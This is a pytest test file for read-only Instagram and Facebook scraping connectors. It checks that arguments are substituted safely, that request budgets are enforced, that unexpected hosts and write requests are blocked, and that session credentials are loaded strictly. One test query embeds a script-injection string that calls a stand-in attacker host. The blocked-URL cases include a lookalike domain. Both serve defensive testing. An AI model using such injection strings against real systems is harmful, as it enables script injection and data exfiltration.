"""Local worker seams; these checks do not claim container/network isolation."""

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from skriller.connectors.facebook_read import FacebookRead, FacebookSearch
from skriller.connectors.instagram_read import InstagramRead, InstagramSearch
from skriller.connectors.social_worker import (
    RequestBudget,
    capture,
    extraction_script,
    main,
    navigation_targets,
    session_credentials,
)
from skriller.security.runner import reviewed_command

ROOT = Path(__file__).parents[2]


def test_generated_scripts_match_the_attributed_subset_without_a_runtime_node_dependency():
    result = subprocess.run(
        [
            shutil.which("node"),
            "--experimental-vm-modules",
            "scripts/build_social_read_scripts.mjs",
            "--check",
        ],
        cwd=ROOT,
        capture_output=True,
        text=True,
        timeout=10,
        check=False,
    )
    assert result.returncode == 0, result.stderr


@pytest.mark.parametrize(
    "operation,source_request",
    [
        (
            "instagram_search",
            InstagramSearch(query='a"; fetch("https://evil.example") //', limit=2),
        ),
        ("instagram_profile", InstagramRead(username="synthetic")),
        ("facebook_search", FacebookSearch(query="synthetic", limit=2)),
        ("facebook_profile", FacebookRead(username="synthetic")),
    ],
)
def test_fixed_command_and_safe_argument_substitution(operation, source_request):
    command = reviewed_command(operation, source_request.model_dump_json())
    assert command[:4] == ["python", "-m", "skriller.connectors.social_worker", operation]
    script = extraction_script(operation, source_request)
    assert "SKRILLER_QUERY_ARGUMENT_89f4" not in script
    assert "SKRILLER_PROFILE_ARGUMENT_89f4" not in script
    if operation == "instagram_search":
        literal = script.split("const query = ", 1)[1]
        assert json.JSONDecoder().raw_decode(literal)[0] == source_request.query
    for target in navigation_targets(operation, source_request):
        assert target.startswith("https://www." + operation.split("_")[0] + ".com/")


def test_profile_fallback_api_sequence_is_bounded_and_rate_limit_stops_later_calls():
    request = InstagramRead(username="synthetic")
    budget = RequestBudget("instagram_profile", request)
    assert budget.allow(request.target_url(), "GET", "document")
    for url in [
        "https://www.instagram.com/api/v1/users/web_profile_info/?username=synthetic",
        "https://www.instagram.com/api/v1/feed/user/synthetic/username/?count=1",
        "https://www.instagram.com/api/v1/users/123/info/",
    ]:
        assert budget.allow(url, "GET", "fetch")
    assert budget.api_requests == 3
    assert not budget.allow("https://www.instagram.com/api/v1/users/456/info/", "GET", "fetch")
    budget.response(429)
    assert not budget.allow("https://static.cdninstagram.com/script.js", "GET", "script")
    assert budget.failure_code == "rate_limited"


@pytest.mark.parametrize(
    "url,method,kind",
    [
        ("https://www.instagram.com.evil.example/a.js", "GET", "script"),
        ("https://www.instagram.com/api/v1/friendships/create", "POST", "fetch"),
        ("https://www.instagram.com/other", "GET", "document"),
        ("http://www.instagram.com/a.js", "GET", "script"),
        ("https://user:secret@www.instagram.com/a.js", "GET", "script"),
        ("https://www.instagram.com:invalid/a.js", "GET", "script"),
        ("https://www.instagram.com/a.jpg", "GET", "image"),
    ],
)
def test_unexpected_navigation_hosts_writes_and_resources_are_blocked(url, method, kind):
    assert not RequestBudget("instagram_search", InstagramSearch(query="synthetic")).allow(
        url, method, kind
    )


@pytest.mark.parametrize(
    "operation,environment",
    [
        ("instagram_profile", {"INSTAGRAM_SESSION_COOKIE": "synthetic-only"}),
        (
            "facebook_profile",
            {"FACEBOOK_USER_ID": "12345", "FACEBOOK_SESSION_COOKIE": "synthetic-only"},
        ),
    ],
)
def test_exact_mounted_credentials_no_host_profile_discovery(
    tmp_path, monkeypatch, operation, environment
):
    monkeypatch.setenv("SKRILLER_SOCIAL_WORKER", "isolated")
    monkeypatch.setattr("skriller.connectors.social_worker.os.path.isfile", lambda _: True)
    path = tmp_path / "credentials.json"
    payload = {"schema_version": 1, "runner": operation, "environment": environment}
    path.write_text(json.dumps(payload))
    assert len(session_credentials(operation, path)) == len(environment)
    payload["environment"]["UNEXPECTED"] = "synthetic"
    path.write_text(json.dumps(payload))
    with pytest.raises(ValueError):
        session_credentials(operation, path)
    monkeypatch.delenv("SKRILLER_SOCIAL_WORKER")
    with pytest.raises(ValueError):
        session_credentials(operation, path)


async def test_capture_never_emits_raw_failure_details_or_retries():
    class Page:
        calls = 0
        url = ""

        async def goto(self, url, **kwargs):
            self.url = url

        async def evaluate(self, script):
            self.calls += 1
            return {"failure": {"message": "HTTP 429 private synthetic details"}}

    page = Page()
    result = await capture(page, "instagram_profile", InstagramRead(username="synthetic"))
    assert result == {"_skriller_error": "rate_limited"}
    assert page.calls == 1


def test_worker_refuses_host_launch_and_arbitrary_commands_without_raw_diagnostics(capsys):
    assert main(["send_message", "{}"]) == 2
    assert capsys.readouterr().err == "Social read unavailable\n"
    with pytest.raises(ValueError):
        reviewed_command("instagram_profile", '{"username":"../accounts"}')
